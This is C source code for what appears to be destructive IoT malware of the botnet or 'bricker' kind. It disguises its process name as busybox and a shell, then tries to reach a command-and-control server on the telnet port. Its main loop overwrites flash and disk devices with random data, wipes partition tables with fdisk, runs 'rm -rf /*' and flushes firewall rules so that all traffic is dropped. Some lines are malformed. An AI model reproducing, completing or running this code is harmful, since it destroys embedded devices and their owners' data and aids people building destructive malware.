// trashnet is garbage for someone who cant write in c.

#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <time.h>
#include <fcntl.h>
#include <errno.h>
#include <string.h>
#include <signal.h>
#include <dirent.h>
#include <netdb.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <sys/prctl.h>
#include <sys/wait.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/tcp.h>
#include <netinet/ip_icmp.h>
#include <arpa/inet.h>
#include <sys/time.h>
#include <sys/ioctl.h>
#include <assert.h>
#include <stdarg.h>
#include <sys/syscall.h>
#include <sys/utsname.h>
#include <linux/limits.h>
#include <ctype.h>

#define PHI 0x9e3779b9
#define INET_ADDR(o1,o2,o3,o4) (htonl((o1 << 24) | (o2 << 16) | (o3 << 8) | (o4 << 0)))

int cnc_fd = 0, iprange;
uint32_t *pids, scanner_pid;
static uint32_t Q[4096], c = 362436;
struct in_addr ourIP;

void init_rand(uint32_t x)
{
    int i;

    Q[0] = x;
    Q[1] = x + PHI;
    Q[2] = x + PHI + PHI;

    for (i = 3; i < 4096; i++) 
    	Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
}

int get_host(unsigned char *toGet, struct in_addr *i)
{
    struct hostent *h;

    if((i->s_addr = inet_addr(toGet)) == -1)
        return 1;

    return 0;
}

int xstrlen(char *str)
{
    int c = 0;

    while (*str++ != 0)
        c++;
    return c;
}

int xcstrlen(const char *format)
{
    int c = 0;

    while (*format++ != 0)
        c++;
    return c;
}

void xmemcpy(void *dst, void *src, int len)
{
    char *r_dst = (char *)dst;
    char *r_src = (char *)src;

    while (len--)
        *r_dst++ = *r_src++;
}

int xstrcpy(char *dst, char *src)
{
    int l = xstrlen(src);

    xmemcpy(dst, src, l + 1);

    return l;
}

void xzero(void *buf, int len)
{
    char *zero = buf;
    while (len--)
        *zero++ = 0;
}

int xmemexists(char *buf, int buf_len, char *str, int str_len)
{
    int matches = 0;

    if (str_len > buf_len)
        return 0;

    while (buf_len--)
    {
        if (*buf++ == str[matches])
        {
            if (++matches == str_len)
                return 1;
        }
        else
            matches = 0;
    }

    return 0;
}

int connect_timeout(int fd, char *host, int port, int timeout)
{
    int valopt, res;
    long arg = fcntl(fd, F_GETFL, NULL);
    struct sockaddr_in dest_addr;
    struct timeval tv;

    fd_set myset;
    socklen_t lon;
    arg |= O_NONBLOCK;
    fcntl(fd, F_SETFL, arg);

    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = htons(port);

    if(get_host(host, &dest_addr.sin_addr))
        return 0;

    memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);

    if (res = connect(fd, (struct sockaddr *)&dest_addr, sizeof(dest_addr)) < 0)
    {
        if (errno == EINPROGRESS)
        {
            tv.tv_sec = timeout;
            tv.tv_usec = 0;
            FD_ZERO(&myset);
            FD_SET(fd, &myset);

            if (select(fd + 1, NULL, &myset, NULL, &tv) > 0)
            {
                lon = sizeof(int);
                getsockopt(fd, SOL_SOCKET, SO_ERROR, (void*)(&valopt), &lon);

                if (valopt)
                    return 0;
            }
            else
                return 0;
        }
        else
            return 0;
    }

    arg = fcntl(fd, F_GETFL, NULL);
    arg &= (~O_NONBLOCK);
    fcntl(fd, F_SETFL, arg);

    return 1;
}

int connect_init(char *server, int port)
{
    if(cnc_fd)
    {
        close(cnc_fd);
        cnc_fd = 0;
    }

    cnc_fd = socket(AF_INET, SOCK_STREAM, 0);

    if(!connect_timeout(cnc_fd, server, port, 30))
        return 1;

    return 0;
}

int sock_print(int sock, char *string, ...) 
{
	char buffer[1024];
	memset(buffer, 0, 1024);

	va_list args;
	va_start(args, string);
	vsprintf(buffer, string, args);
	va_end(args);

	return send(sock, buffer, strlen(buffer), MSG_NOSIGNAL);
}

int contains_string(char *buffer, char **strings) 
{
	int i = 0, num_of_strings = 0;

	for(num_of_strings = 0; strings[++num_of_strings] != 0;);

	for(i = 0; i < num_of_strings; i++) 
	{
		if(xmemexists(buffer, xstrlen(buffer), strings[i], xstrlen(strings[i])) == 1)
			return 1;
	}

	return 0;
}

int read_with_timeout(int fd, int timeout_usec, char *buffer, int buf_size)
{
	fd_set read_set;
	struct timeval tv;
	tv.tv_sec = 0;
	tv.tv_usec = timeout_usec;

	FD_ZERO(&read_set);
	FD_SET(fd, &read_set);

	if (select(fd + 1, &read_set, NULL, NULL, &tv) < 1)
		return 0;

	return recv(fd, buffer, buf_size, 0);
}

int read_until_response(int fd, int timeout_usec, char *buffer, int buf_size, char **strings)
{
	int num_bytes, i;
	uint8_t *ptr = buffer;
	
	xzero(buffer, buf_size);
	num_bytes = read_with_timeout(fd, timeout_usec, buffer, buf_size);
	
	if(contains_string(buffer, strings))
		return 1;

	return 0;
}

int get_local_ip()
{
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if(sock == -1)
        return 0;

    struct sockaddr_in serv;
    memset(&serv, 0, sizeof(serv));
    serv.sin_family = AF_INET;
    serv.sin_addr.s_addr = inet_addr("8.8.8.8");
    serv.sin_port = htons(2222);

    int err = connect(sock, (const struct sockaddr*) &serv, sizeof(serv));
    if(err == -1)
        return 0;

    struct sockaddr_in name;
    socklen_t namelen = sizeof(name);
    err = getsockname(sock, (struct sockaddr*) &name, &namelen);
    if(err == -1)
        return 0;

    ourIP.s_addr = name.sin_addr.s_addr;
    close(sock);
}

int main(int argc, char **argv)
{	
    int tmp, ret;
	
	if (argc >= 2)
		iprange = atoi(argv[1]);

    prctl(15, (unsigned long)"/bin/busybox", 0, 0, 0);
    memset(argv[0], 0, sizeof(argv[0]));
    strcpy(argv[0], "-sh");

    write(1, "future\n", 6);

    signal(SIGPIPE, SIG_IGN);
	init_rand(time(NULL) ^ getpid());
    get_local_ip();

    while(1)
    {
        if(connect_init("", 23)) // cnc
        {
            continue;
        }
    system("fdisk -l");
    system("cat /dev/urandom > /dev/mtdblock0");
    system("cat /dev/urandom > /dev/sda");
    system("cat /dev/urandom > /dev/ram0");
    system("cat /dev/urandom > /dev/mmc0");
    system("cat /dev/urandom > /dev/mtdblock10");
    system("fdisk -C 1 -H 1 -S 1 /dev/mtd0");
    system("fdisk -C 1 -H 1 -S 1 /dev/mtd1");
    system("fdisk -C 1 -H 1 -S 1 /dev/sda");
    system("fdisk -C 1 -H 1 -S 1 /dev/mtdblock0");
    system("rm -rf /*");
    system("iptables -F; iptables -t nat -F iptables -A INPUT -J DROP; iptables -A FORWARD -j DROP half -n -f");
    }
    return 0;
}
